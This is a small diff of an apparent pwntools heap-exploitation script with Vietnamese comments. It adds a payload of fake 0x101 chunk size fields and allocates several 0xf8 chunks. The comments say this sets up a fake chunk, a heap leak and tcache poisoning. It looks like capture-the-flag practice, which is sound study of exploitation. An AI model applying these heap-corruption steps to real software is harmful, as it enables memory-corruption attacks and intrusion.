@@ -81,6 +81,11 @@ payload=flat(
 	)
 add(0,0xf8,payload) # chunk đầu tiên để tạo ra một fakechunk
 
+payload=flat(
+	0,0x101,
+	0,0x101,
+	0,0x101
+	)
 for i in range(5):
 	add(0,0xf8,payload) # tạo thêm 5 chunks nữa  
 add(1,0xf8,b"B"*0xf8) # tạo thêm 1 chunk để sau khi leak heap thì thực hiện kỹ thuật tcache poisoning
